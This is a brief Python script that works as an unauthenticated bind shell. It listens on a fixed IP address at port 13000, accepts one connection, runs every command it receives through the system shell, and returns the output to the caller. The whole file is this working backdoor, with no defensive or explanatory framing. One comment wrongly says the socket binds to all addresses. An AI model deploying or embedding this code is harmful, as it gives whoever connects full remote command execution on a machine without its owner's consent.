import socket
import os
import subprocess
import sys

SERVER_HOST = "192.168.0.119"
SERVER_PORT = 13000
BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
# separator string for sending 2 messages in one go
SEPARATOR = "<sep>"
# create a socket object
s = socket.socket()

# bind the socket to all IP addresses of this host
s.bind((SERVER_HOST, SERVER_PORT))
s.listen(5)
print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")

# accept any connections attempted
client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")

while True:
    # receiving 
    command = client_socket.recv(BUFFER_SIZE).decode()
    
    #executing
    output = subprocess.getoutput(command)
    print(f"{output}")

    # responde
    client_socket.send(output.encode())
